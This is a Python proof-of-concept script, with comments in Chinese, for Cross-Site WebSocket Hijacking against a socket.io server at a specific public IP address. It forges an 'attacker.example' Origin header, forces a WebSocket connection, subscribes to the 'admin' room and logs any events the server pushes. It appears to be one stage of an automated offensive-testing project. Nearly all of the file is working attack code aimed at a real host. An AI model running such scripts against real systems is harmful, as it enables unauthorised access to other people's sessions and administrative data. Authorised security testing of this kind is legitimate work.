#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Stage 7b - python-socketio 官方客户端 CSWSH PoC
目标：http://35.234.50.28:3100/socket.io/

用官方 socketio.Client 自动处理 EIO=4 + socket.io v4 协议握手
如果服务端允许，则验证 CSWSH 钓鱼链完全可行
"""
import json
import socketio
import time
from datetime import datetime

LOG_PATH = "/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/stage7b_sio_official.log"
TARGET = "http://35.234.50.28:3100"


def log(msg):
    line = f"[{datetime.utcnow().isoformat()}Z] {msg}"
    print(line, flush=True)
    with open(LOG_PATH, "a") as f:
        f.write(line + "\n")


# 自定义 headers 模拟恶意 Origin
headers = {
    "Origin": "https://attacker.example",
    "User-Agent": "Mozilla/5.0 (Stage7b CSWSH PoC)",
}

received_events = []
connected_flag = [False]
disconnect_reason = [None]


def on_connect():
    log("[CLIENT EVENT] connect")
    connected_flag[0] = True


def on_disconnect(reason=None):
    log(f"[CLIENT EVENT] disconnect reason={reason}")
    disconnect_reason[0] = reason


def on_event(event, *args):
    log(f"[CLIENT EVENT] '{event}' args={args}")
    received_events.append({"event": event, "args": args, "time": time.time()})


def main():
    log("Stage 7b - python-socketio 官方客户端 CSWSH PoC")
    log(f"目标: {TARGET}")
    log(f"Origin: https://attacker.example")
    log(f"withCredentials: True\n")

    # 创建 client（logger=True 可看到所有协议交互）
    sio = socketio.Client(
        logger=True,
        engineio_logger=True,
        reconnection=False,
        request_timeout=10,
    )

    sio.on("connect", on_connect)
    sio.on("disconnect", on_disconnect)
    sio.on("*", on_event)  # 捕获所有事件

    try:
        log("→ connect(...)")
        sio.connect(
            TARGET,
            headers=headers,
            transports=["websocket"],  # 强制 WS upgrade
            wait_timeout=10,
        )
        log(f"✓ connect() 返回 (connected={sio.connected}, sid={sio.sid})")
    except Exception as e:
        log(f"✗ connect() 异常: {type(e).__name__}: {e}")
        return

    if not sio.connected:
        log("✗ 未 connected，服务端拒绝连接")
        return

    log("✓ 客户端已 connected - CSWSH 攻击面验证通过")

    # 订阅任意业务事件
    log("\n→ 订阅业务事件（任意 roomName）")
    try:
        sio.emit("client.subscribe", {"roomName": "admin"})
        log("  ✓ emit('client.subscribe', {roomName: 'admin'})")
    except Exception as e:
        log(f"  ✗ emit 异常: {e}")

    # 等 5 秒看是否收到任何服务端推送
    log("\n→ 等待 5 秒看是否收到服务端推送...")
    sio.sleep(5)

    log(f"\n收到事件数: {len(received_events)}")
    for ev in received_events:
        log(f"  - event='{ev['event']}' args={ev['args']}")

    try:
        sio.disconnect()
        log("→ disconnect() 完成")
    except Exception as e:
        log(f"disconnect 异常: {e}")


if __name__ == "__main__":
    main()